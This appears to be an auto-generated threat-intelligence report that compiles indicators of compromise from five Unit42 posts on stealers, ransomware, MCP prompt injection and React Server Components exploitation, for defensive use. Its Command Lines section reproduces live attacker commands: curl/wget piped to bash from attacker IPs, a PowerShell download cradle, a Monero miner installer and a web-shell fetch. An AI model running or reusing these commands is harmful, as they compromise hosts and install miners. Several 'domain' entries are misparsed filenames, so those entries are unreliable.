# Unit42 Blogs

## 📋 Report Metadata

**Issue:** [#1](https://github.com/apps-dfir/Security-Operations/issues/1)<br>
**Analyst:** Apramey 'Apps' Shurpali<br>
**Generated:** 2026-01-06 20:23:01 UTC<br>
**Sources Processed:** 5<br>
**OCR Enabled:** Yes

## 📚 Sources

1. [VVS Discord Stealer Using Pyarmor for Obfuscation and Detection Evasion](https://unit42.paloaltonetworks.com/vvs-stealer/)
2. [From Linear to Complex: An Upgrade in RansomHouse Encryption](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
3. [01flip: Multi-Platform Ransomware Written in Rust](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
4. [New Prompt Injection Attack Vectors Through MCP Sampling](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
5. [Exploitation of Critical Vulnerability in React Server Components (Updated December 12)](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

## 📊 Report Summary

**Total Unique IOCs:** 171<br>
**High Confidence IOCs:** 118<br>
**MITRE ATT&CK Techniques:** 22<br>
**Images with OCR Data:** 17<br>
**Breakdown:** CVEs: 3, URLs: 18, Domains: 79, IPs: 20, SHA256: 38, MD5: 1, Commands: 12

## Executive Summary (Analyst Fill-In)

### Key Takeaways
- What happened (1-2 bullets)
- Who/what is affected (orgs, sectors, regions)
- Why it matters to us (risk / exposure / priority)

### Initial Assessment
- Confidence level: (low/med/high)
- Recommended actions: (monitor / hunt / block / brief)

### Workflow Feedback (Analyst Fill-In)
- Extraction quality: (good / acceptable / poor)
- False positives noted: (none / some / many)
- Missing IOCs observed: (none / list below)
- Parsing issues: (none / describe)
- Suggestions for improvement:

## 🔍 Consolidated Indicators of Compromise

> IOCs are deduplicated across sources. Confidence: 🟢 HIGH | 🟡 MEDIUM | 🔴 LOW

### CVEs

- 🟢 `CVE-2019-11580` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `CVE-2025-55182` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `CVE-2025-66478` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

### URLs

- 🟢 `hxxp://115[.]42[.]60[.]223:61236/slt` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://146[.]88[.]129[.]138:5511/443nb64` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://156[.]234[.]209[.]103:20912/get[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://156[.]234[.]209[.]103:20913/get[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://156[.]234[.]209[.]103:63938/nrCrQ` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://193[.]24[.]123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://193[.]24[.]123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg[.]sh')[.]read` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://193[.]34[.]213[.]150/nuts/bolts` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://31[.]57[.]46[.]28/test[.]sh&&sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://45[.]32[.]158[.]54/5e51aff54626ef7f/x86_64` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://46[.]36[.]37[.]85:12000/sex[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://47[.]84[.]57[.]207/index` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://95[.]169[.]180[.]135:8443/pamssod` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://res[.]qiqigece[.]top/nginx1` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://superminecraft[.]net[.]br:3000/sex[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxps://raw[.]githubusercontent[.]com/C3Pool/xmrig_setup/master/setup_c3pool_miner` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxps://raw[.]githubusercontent[.]com/C3Pool/xmrig_setup/master/setup_c3pool_miner[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxps://sup001[.]oss-cn-hongkong[.]aliyuncs[.]com/123/python1[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

### Domains

- 🟢 `093214[.]xyz` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `Obfuscator[.]io` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `System[.]Net` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ast[.]NodeVisitor` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `check[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `cn-hongkong[.]aliyuncs` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `d5[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `fn32[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `get[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `keep[.]camdvr` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `kof97[.]lol` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `proton[.]me` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `ptb[.]discord` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `python1[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `raw[.]githubusercontent` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `reactcdn[.]windowserrorapis` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `res[.]qiqigece` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `resolv[.]conf` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `script[.]py` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `segawon[.]id` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `sex[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `sup001[.]oss` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `superminecraft[.]net` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `test[.]sh` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `urllib[.]request` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `vvs[.]py` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `vvs[.]pyc` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🔴 `Files[.]txt` [[2]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🔴 `Next[.]js` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `Node[.]js` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `README[.]md` [[4]](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
- 🔴 `RECOVER-YOUR-FILE[.]TXT` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🔴 `Update[.]exe` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🔴 `User32[.]dll` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🔴 `adfind[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `at[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `bun[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `cmd[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `cscript[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `csvde[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `driverquery[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `dsquery[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `filemanager-standalone[.]js` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `fm[.]js` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `injection-obf[.]js` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🔴 `ipconfig[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `jscript[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `klist[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `mshta[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `nbstat[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `nbtscan[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `net[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `net1[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `netsh[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `netstat[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `nltest[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `node[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `ntdsutil[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `ping[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `powershell[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `pycdc[.]exe` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🔴 `python[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `python311[.]dll` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🔴 `query[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `quser[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `qwinsta[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `rundll32[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `segawon[.]txt` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `server[.]js` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `systeminfo[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `tasklist[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `tmp[.]txt` [[4]](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
- 🔴 `traceroute[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `vssadmin[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `vssvc[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `wevtutil[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `whoami[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `whois[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `wscript[.]exe` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

### IP Addresses

- 🟢 `115[.]0[.]0[.]0` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `115[.]42[.]60[.]223` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `140[.]99[.]223[.]178` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `146[.]88[.]129[.]138` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `154[.]89[.]152[.]240` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `156[.]234[.]209[.]103` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `192[.]238[.]202[.]17` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `193[.]24[.]123[.]68` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `193[.]34[.]213[.]150` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `31[.]56[.]27[.]76` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `31[.]57[.]46[.]28` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `38[.]162[.]112[.]141` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `45[.]134[.]174[.]235` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `45[.]32[.]158[.]54` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `46[.]36[.]37[.]85` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `47[.]84[.]57[.]207` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `47[.]84[.]79[.]46` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `72[.]62[.]67[.]33` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `95[.]169[.]180[.]135` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `127[.]0[.]0[.]7` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)

### File Hashes

**SHA256:**
- 🟢 `0fe7fcc66726f8f2daed29b807d1da3c531ec004925625855f8889950d0d24d8` [[2]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `1663d98c259001f1b03f82d0c5bee7cfd3c7623ccb83759c994f9ab845939665` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `18c68a982f91f665effe769f663c51cb0567ea2bfc7fab6a1a40d4fe50fc382b` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1a3e7b4ee2b2858dbac2d73dd1c52b1ea1d69c6ebb24cc434d1e15e43325b74e` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1cdd9b0434eb5b06173c7516f99a832dc4614ac10dda171c8eed3272a5e63d20` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1e31dc074a4ea7f400cb969ea80e8855b5e7486660aab415da17591bc284ac5b` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1f3f0695c7ec63723b2b8e9d50b1838df304821fcb22c7902db1f8248a812035` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `26b3c1269064ba1bf2bfdcf2d3d069e939f0e54fc4189e5a5263a49e17872f2a` [[2]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `2b0dc27f035ba1417990a21dafb361e083e4ed94a75a1c49dc45690ecf463de4` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `2ca913556efd6c45109fd8358edb18d22a10fb6a36c1ab7b2df7594cd5b0adbc` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `307d9cefa7a3147eb78c69eded273e47c08df44c2004f839548963268d19dd87` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `33641bfbbdd5a9cd2320c61f65fe446a2226d8a48e3bd3c29e8f916f0592575f` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `4a759cbc219bcb3a1f8380a959307b39873fb36a9afd0d57ba0736ad7a02763b` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `4ff096fbea443778fec6f960bf2b9c84da121e6d63e189aebaaa6397d9aac948` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `55ae00bc8482afd085fd128965b108cca4adb5a3a8a0ee2957d76f33edd5a864` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `62e9a01307bcf85cdaeecafd6efb5be72a622c43a10f06d6d6d3b566b072228d` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `6aad1c36ab9c7c44350ebe3a17178b4fd93c2aa296e2af212ab28d711c0889a3` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `7a1554383345f31f3482ba3729c1126af7c1d9376abb07ad3ee189660c166a2b` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `7d25a97be42b357adcc6d7f56ab01111378a3190134aa788b1f04336eb924b53` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `7f05bad031d22c2bb4352bf0b6b9ee2ca064a4c0e11a317e6fedc694de37737a` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `8189c708706eb7302d7598aeee8cd6bdb048bf1a6dbe29c59e50f0a39fd53973` [[2]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `9c931f7f7d511108263b0a75f7b9fcbbf9fd67ebcc7cd2e5dcd1266b75053624` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `a455731133c00fdd2a141bdfba4def34ae58195126f762cdf951056b0ef161d4` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ac2182dfbf56d58b4d63cde3ad6e7a52fed54e52959e4c82d6fc999f20f8d693` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ac7027f30514d0c00d9e8b379b5ad8150c9827c827dc7ee54d906fc2585b6bf6` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `b38ec4c803a2d84277d9c598bfa5434fb8561ddad0ec38da6f9b8ece8104d787` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ba41f0c7ea36cefe7bc9827b3cf27308362a4d07a8c97109704df5d209bce191` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `bc31561c44a36e1305692d0af673bc5406f4a5bb2c3f2ffdb613c09b4e80fa9f` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `bf602b11d99e815e26c88a3a47eb63997d43db8b8c60db06d6fbddf386fd8c4a` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `c7e6591e5e021daa30f949a6f6e0699ef2935d2d7c06ea006e3b201c52666e07` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)
- 🟢 `d36afcfe1ae2c3e6669878e6f9310a04fb6c8af525d17c4ffa8b510459d7dd4d` [[2]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `d704541cde64a3eef5c4f80d0d7f96dc96bae8083804c930111024b274557b16` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `d9313f949af339ed9fafb12374600e66b870961eeb9b2b0d4a3172fd1aa34ed0` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `e2d7c8491436411474cef5d3b51116ddecfee68bab1e15081752a54772559879` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `e5834b7bdd70ec904470d541713e38fe933e96a4e49f80dbfb25148d9674f957` [[3]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `ebdb85704b2e7ced3673b12c6f3687bc0177a7b1b3caef110213cc93a75da837` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `f88ce150345787dd1bcfbc301350033404e32273c9a140f22da80810e3a3f6ea` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `fc9e53675e315edeea2292069c3fbc91337c972c936ca0f535da01760814b125` [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

**MD5:**
- 🟢 `273b1b1373cf25e054a61e2cb8a947b8` [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)

### Command Lines

🟢 Command:
```
Python major version
```
Sources: [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)

🟢 Command:
```
Python minor version
```
Sources: [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)

🟢 Command:
```
Python source code.
```
Sources: [[1]](https://unit42.paloaltonetworks.com/vvs-stealer/)

🟢 Command:
```
") || (command -v python >/dev/null 2>&1 && python -c "
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
(command -v curl >/dev/null 2>&1 && curl -s http://47.84.57.207/index | bash) || (command -v wget >/dev/null 2>&1 && wget -q -O- http://47.84.57.207/index | bash) || (command -v python3 >/dev/null 2>&1 && python3 -c "import urllib.request as u,subprocess;
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null || wget -qO ./s.sh http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh 2>/dev/null || python3 -c "import urllib.request as u;open('./s.sh','wb').write(u.urlopen('http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh').read())") && [ -s ./s.sh ] && chmod +x ./s.sh && ./s.sh && break; sleep 300; done
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//46.36.37.85:12000/sex.sh && bash sex.sh
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//help.093214.xyz:9731/fn32.sh | bash | gzip -n | base64 -w0),/bin/sh -c echo VULN_CHECK_SUCCESS
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//keep.camdvr.org:8000/d5.sh | bash | gzip -n | base64 -w0),/bin/sh -c echo $((41*271)),/bin/sh -c echo $((42259*42449)),/bin/sh -c wget http://superminecraft.net.br:3000/sex.sh && bash sex.sh,/bin/sh -c wget https://sup001.oss-cn-hongkong.aliyuncs.com/123/python1.sh && chmod 777 python1.sh && ./python1.sh
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/rjs/filemanager-standalone.js 2>&1 && wc -c fm.js,/bin/sh -c echo $((41*271)),/bin/sh -c echo 'segawon.id' > /app/public/segawon.txt && chmod 644 /app/public/segawon.txt,/bin/sh -c echo 'segawon.id' > /app/web/public/segawon.txt && chmod 644 /app/web/public/segawon.txt,/bin/sh -c echo 'segawon.id' > /var/www/html/segawon.txt && chmod 644 /var/www/html/segawon.txt,/bin/sh -c id,/bin/sh -c killall -9 node 2>/dev/null,/bin/sh -c ls -la
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
/bin/sh -c (wget -qO- http://156.234.209.103:20912/get.sh || curl -fsSL http://156.234.209.103:20912/get.sh) | bash,/bin/sh -c curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner .sh | bash -s <encoded Monero address>,/bin/sh -c echo $((41*271)),/bin/sh -c echo $((42636*43926)),/bin/sh -c powershell -enc IEX (New-Object System.Net.Webclient).DownloadString('http://156.234.209.103:63938/nrCrQ')
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
/bin/sh -c echo wget -O /tmp/test.sh http://31.57.46.28/test.sh&&sh /tmp/test.sh|base64 -d|sh,/bin/sh -c id && pwd && ls -la && ps aux | grep node
```
Sources: [[5]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

## 🎯 MITRE ATT&CK Techniques

| Technique | Sources |
|-----------|---------|
| T1027.015: Compression | [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/) |
| T1036: Masquerading | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1059.001: PowerShell | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
